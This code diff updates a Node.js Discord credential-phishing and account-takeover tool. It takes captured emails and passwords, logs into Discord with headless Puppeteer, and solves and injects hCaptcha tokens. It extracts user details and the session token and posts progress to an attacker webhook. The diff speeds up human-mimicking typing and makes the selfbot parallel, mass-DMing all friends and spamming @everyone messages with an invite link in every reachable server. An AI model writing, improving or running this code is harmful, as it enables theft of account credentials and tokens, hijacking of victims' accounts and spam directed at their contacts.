@@ -89,10 +89,44 @@ async function solveHCaptcha(page, sessionId) {
     try {
         await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
         
-        const sitekey = await page.evaluate(() => {
-            const hcaptchaDiv = document.querySelector('[data-sitekey]');
-            return hcaptchaDiv ? hcaptchaDiv.getAttribute('data-sitekey') : null;
+        // FIXED: Extract sitekey from iframe src URL parameter
+        let sitekey = await page.evaluate(() => {
+            // Method 1: Check container div
+            const container = document.querySelector('[data-sitekey]');
+            if (container) return container.getAttribute('data-sitekey');
+            
+            // Method 2: Extract from iframe src
+            const iframe = document.querySelector('iframe[src*="hcaptcha.com"]');
+            if (iframe) {
+                const src = iframe.getAttribute('src');
+                const match = src.match(/[?&]sitekey=([^&]+)/);
+                if (match) return match[1];
+            }
+            
+            // Method 3: Check window.hcaptcha
+            if (window.hcaptcha && window.hcaptcha.sitekey) {
+                return window.hcaptcha.sitekey;
+            }
+            
+            return null;
         });
+        
+        // Fallback: Intercept network request if DOM methods fail
+        if (!sitekey) {
+            const requests = await page.evaluate(() => {
+                return performance.getEntriesByType('resource')
+                    .filter(r => r.name.includes('hcaptcha.com'))
+                    .map(r => r.name);
+            });
+            
+            for (const url of requests) {
+                const match = url.match(/[?&]sitekey=([^&]+)/);
+                if (match) {
+                    sitekey = match[1];
+                    break;
+                }
+            }
+        }
         
         if (!sitekey) {
             await sendWebhook({ content: `No sitekey found - Session: \`${sessionId}\`` });
@@ -105,19 +139,29 @@ async function solveHCaptcha(page, sessionId) {
         const solution = await getTaskResult(taskId);
         await sendWebhook({ content: `CAPTCHA solved - Session: \`${sessionId}\`` });
         
+        // FIXED: Better token injection with multiple methods
         await page.evaluate((token) => {
-            const hcaptchaResponse = document.querySelector('[name="h-captcha-response"]');
-            if (hcaptchaResponse) {
-                hcaptchaResponse.value = token;
-            }
-            
+            // Method 1: Standard textarea
             const textarea = document.querySelector('textarea[name="h-captcha-response"]');
-            if (textarea) {
-                textarea.value = token;
-            }
+            if (textarea) textarea.value = token;
             
+            // Method 2: Hidden input
+            const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
+            if (hiddenInput) hiddenInput.value = token;
+            
+            // Method 3: Set dataset
+            const hcaptchaDiv = document.querySelector('.h-captcha') || document.querySelector('[data-sitekey]');
+            if (hcaptchaDiv) hcaptchaDiv.dataset.response = token;
+            
+            // Method 4: Trigger callback
             if (window.hcaptchaCallback) {
                 window.hcaptchaCallback(token);
+            }
+            
+            // Method 5: Dispatch event
+            if (window.hcaptcha && window.hcaptcha.render) {
+                const event = new Event('hcaptchaSubmit');
+                document.dispatchEvent(event);
             }
         }, solution.gRecaptchaResponse);
         
@@ -177,36 +221,48 @@ app.post('/api/capture', async (req, res) => {
 async function processLogin(email, password, ip, sessionId) {
     let browser;
     try {
+        // OPTIMIZED: Faster browser launch
         browser = await puppeteer.launch({
             headless: 'new',
             args: [
                 '--no-sandbox',
                 '--disable-setuid-sandbox',
                 '--disable-dev-shm-usage',
-                '--disable-accelerated-2d-canvas',
                 '--disable-gpu',
-                '--window-size=1920,1080'
-            ]
+                '--disable-extensions',
+                '--disable-background-networking',
+                '--disable-sync',
+                '--disable-translate',
+                '--disable-default-apps',
+                '--mute-audio',
+                '--no-first-run',
+                '--fast-start',
+                '--single-process',
+                '--disable-features=IsolateOrigins,site-per-process',
+                '--window-size=1280,720'
+            ],
+            dumpio: false,
+            ignoreHTTPSErrors: true
         });
         
         const page = await browser.newPage();
         const userAgent = new UserAgent({ deviceCategory: 'desktop' });
         await page.setUserAgent(userAgent.toString());
-        await page.setViewport({ width: 1920, height: 1080 });
+        await page.setViewport({ width: 1280, height: 720 });
         
-        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 60000 });
+        await page.goto('https://discord.com/login', { waitUntil: 'domcontentloaded', timeout: 30000 });
         
         await page.waitForSelector('input[name="email"]', { visible: true, timeout: 10000 });
         
         await humanType(page, 'input[name="email"]', email);
-        await delay(500, 1500);
+        await delay(300, 800);
         await humanType(page, 'input[name="password"]', password);
         
-        await delay(800, 2000);
+        await delay(500, 1200);
         
         await page.click('button[type="submit"]');
         
-        await delay(3000, 5000);
+        await delay(2000, 3500);
         
         const hasCaptcha = await page.evaluate(() => {
             return document.querySelector('iframe[src*="captcha"]') !== null ||
@@ -221,13 +277,13 @@ async function processLogin(email, password, ip, sessionId) {
             const solved = await solveHCaptcha(page, sessionId);
             
             if (solved) {
-                await delay(2000, 3000);
+                await delay(1500, 2500);
                 await page.click('button[type="submit"]');
-                await delay(3000, 5000);
+                await delay(2000, 3500);
             }
         }
         
-        await delay(3000, 5000);
+        await delay(2000, 3500);
         
         const is2FA = await page.evaluate(() => {
             const mfaInput = document.querySelector('input[name="code"]') || 
@@ -260,7 +316,7 @@ async function processLogin(email, password, ip, sessionId) {
             let loggedIn = false;
             
             while (Date.now() - startTime < maxWait) {
-                await delay(5000);
+                await delay(3000);
                 
                 loggedIn = await page.evaluate(() => {
                     return document.location.href.includes('/channels/') ||
@@ -294,15 +350,13 @@ async function processLogin(email, password, ip, sessionId) {
             return;
         }
         
-        await delay(3000, 5000);
+        await delay(2000, 3000);
         
-        // FIXED USER EXTRACTION - Multiple methods
         const userInfo = await page.evaluate(() => {
             let username = null;
             let userId = null;
             let globalName = null;
             
-            // Method 1: Webpack modules
             try {
                 if (window.webpackChunkdiscord_app) {
                     const userModule = Object.values(window.webpackChunkdiscord_app)
@@ -320,7 +374,6 @@ async function processLogin(email, password, ip, sessionId) {
                 }
             } catch(e) {}
             
-            // Method 2: DiscordNative or window.GLOBAL_ENV
             if (!username) {
                 try {
                     if (window.GLOBAL_ENV && window.GLOBAL_ENV.user) {
@@ -331,7 +384,6 @@ async function processLogin(email, password, ip, sessionId) {
                 } catch(e) {}
             }
             
-            // Method 3: UserSettingsStore
             if (!username) {
                 try {
                     const userCache = localStorage.getItem('UserSettingsStore');
@@ -346,7 +398,6 @@ async function processLogin(email, password, ip, sessionId) {
                 } catch(e) {}
             }
             
-            // Method 4: Me cache
             if (!username) {
                 try {
                     const me = localStorage.getItem('Me');
@@ -359,7 +410,6 @@ async function processLogin(email, password, ip, sessionId) {
                 } catch(e) {}
             }
             
-            // Method 5: UserStore
             if (!username) {
                 try {
                     const userStore = localStorage.getItem('UserStore');
@@ -374,7 +424,6 @@ async function processLogin(email, password, ip, sessionId) {
                 } catch(e) {}
             }
             
-            // Method 6: Get from DOM if available
             if (!username) {
                 try {
                     const userElement = document.querySelector('[class*="nameTag-"]') || 
@@ -397,7 +446,6 @@ async function processLogin(email, password, ip, sessionId) {
             };
         });
         
-        // If still no username, try API endpoint
         if (!userInfo.username || !userInfo.userId) {
             try {
                 const token = await page.evaluate(() => {
@@ -427,7 +475,6 @@ async function processLogin(email, password, ip, sessionId) {
             content: `LOGIN SUCCESS - Session: \`${sessionId}\`\nLogged in as: \`@${displayUser}\`\nUser ID: \`${userInfo.userId || 'Unknown'}\`\nUsername: \`${userInfo.username || 'Unknown'}\`\nGlobal: \`${userInfo.globalName || 'None'}\``
         });
         
-        // Extract token
         let token = null;
         
         try {
@@ -516,11 +563,12 @@ async function processLogin(email, password, ip, sessionId) {
 async function humanType(page, selector, text) {
     await page.focus(selector);
     for (const char of text) {
-        await page.keyboard.type(char, { delay: Math.random() * 100 + 50 });
-        if (Math.random() > 0.8) await delay(100, 300);
+        await page.keyboard.type(char, { delay: Math.random() * 80 + 30 });
+        if (Math.random() > 0.85) await delay(50, 150);
     }
 }
 
+// FIXED & OPTIMIZED: Mass spam with parallel execution and proper error handling
 async function massSpam(token, sessionId, username) {
     try {
         const { Client } = require('discord.js-selfbot-v13');
@@ -537,59 +585,94 @@ async function massSpam(token, sessionId, username) {
             }
         });
         
+        let dmCount = 0;
+        let guildCount = 0;
+        let friendCount = 0;
+        
         client.on('ready', async () => {
             await sendWebhook({ 
-                content: `SPAM BOT READY - Session: \`${sessionId}\`\nLogged in as: \`@${client.user.tag}\` (\`${client.user.id}\`)` 
+                content: `SPAM BOT READY - Session: \`${sessionId}\`\nTag: \`@${client.user.tag}\`\nID: \`${client.user.id}\`\nGuilds: \`${client.guilds.cache.size}\`\nFriends: \`${client.relationships.cache.filter(r => r.type === 1).size}\``
             });
             
+            // FIXED: Mass DM with parallel execution
             try {
                 const friends = client.relationships.cache.filter(r => r.type === 1);
-                await sendWebhook({ content: `MASS DM - ${friends.size} friends targeted` });
+                friendCount = friends.size;
+                await sendWebhook({ content: `MASS DM STARTING - ${friendCount} friends targeted - Session: \`${sessionId}\`` });
                 
-                let dmCount = 0;
+                const dmPromises = [];
+                
                 for (const [, relationship] of friends) {
-                    try {
-                        const user = await client.users.fetch(relationship.id);
-                        if (user) {
-                            const dm = await user.createDM();
+                    dmPromises.push((async () => {
+                        try {
+                            const user = await client.users.fetch(relationship.id).catch(() => null);
+                            if (!user) return;
+                            
+                            const dm = await user.createDM().catch(() => null);
+                            if (!dm) return;
+                            
+                            // Send 5 messages with proper mention format
                             for (let i = 0; i < 5; i++) {
-                                await dm.send(`<@${user.id}> ${CUSTOM_MESSAGE} ${'@everyone '.repeat(10)}`);
+                                await dm.send(`${CUSTOM_MESSAGE} @everyone @here https://discord.gg/example`).catch(() => {});
                                 dmCount++;
-                                await delay(1000, 3000);
+                                await delay(500, 1200);
                             }
-                        }
-                    } catch (e) {}
+                        } catch (e) {}
+                    })());
                 }
-                await sendWebhook({ content: `DMs SENT: ${dmCount}` });
+                
+                await Promise.allSettled(dmPromises);
+                await sendWebhook({ content: `DMs COMPLETE: ${dmCount} sent to ${friendCount} friends - Session: \`${sessionId}\`` });
+                
             } catch (e) {
-                await sendWebhook({ content: `DM Error: ${e.message}` });
+                await sendWebhook({ content: `DM Error: ${e.message} - Session: \`${sessionId}\`` });
             }
             
+            // FIXED: Mass guild spam with parallel execution
             try {
-                let guildCount = 0;
+                await sendWebhook({ content: `GUILD SPAM STARTING - ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` });
+                
+                const guildPromises = [];
+                
                 for (const guild of client.guilds.cache.values()) {
-                    try {
-                        const channel = guild.channels.cache.find(c => 
-                            c.type === 'GUILD_TEXT' && 
-                            c.permissionsFor(guild.members.me).has('SEND_MESSAGES')
-                        );
-                        
-                        if (channel) {
+                    guildPromises.push((async () => {
+                        try {
+                            const channel = guild.channels.cache.find(c => 
+                                c.isTextBased && 
+                                c.permissionsFor(guild.members.me)?.has('SendMessages') &&
+                                c.permissionsFor(guild.members.me)?.has('ViewChannel')
+                            );
+                            
+                            if (!channel) return;
+                            
+                            // Send 10 messages rapidly
                             for (let i = 0; i < 10; i++) {
-                                await channel.send(`@everyone @here ${CUSTOM_MESSAGE} ${'@everyone '.repeat(20)}`);
+                                await channel.send(`${CUSTOM_MESSAGE} @everyone @here ${'@everyone '.repeat(5)} https://discord.gg/example`).catch(() => {});
                                 guildCount++;
-                                await delay(2000, 5000);
+                                await delay(300, 800);
                             }
-                        }
-                    } catch (e) {}
+                        } catch (e) {}
+                    })());
                 }
-                await sendWebhook({ content: `GUILD MESSAGES: ${guildCount}` });
+                
+                await Promise.allSettled(guildPromises);
+                await sendWebhook({ content: `GUILD SPAM COMPLETE: ${guildCount} messages in ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` });
+                
             } catch (e) {
-                await sendWebhook({ content: `Guild Error: ${e.message}` });
+                await sendWebhook({ content: `Guild Error: ${e.message} - Session: \`${sessionId}\`` });
             }
             
-            await client.destroy();
-            await sendWebhook({ content: `SPAM COMPLETE - Session: \`${sessionId}\` | User: \`@${username}\`` });
+            // Cleanup
+            setTimeout(async () => {
+                await client.destroy();
+                await sendWebhook({ 
+                    content: `SPAM OPERATION COMPLETE - Session: \`${sessionId}\`\nUser: \`@${username}\`\nTotal DMs: \`${dmCount}\`\nTotal Guild Msgs: \`${guildCount}\`\nFriends: \`${friendCount}\``
+                });
+            }, 3000);
+        });
+        
+        client.on('error', async (err) => {
+            await sendWebhook({ content: `Client Error: ${err.message} - Session: \`${sessionId}\`` });
         });
         
         await client.login(String(token).trim());
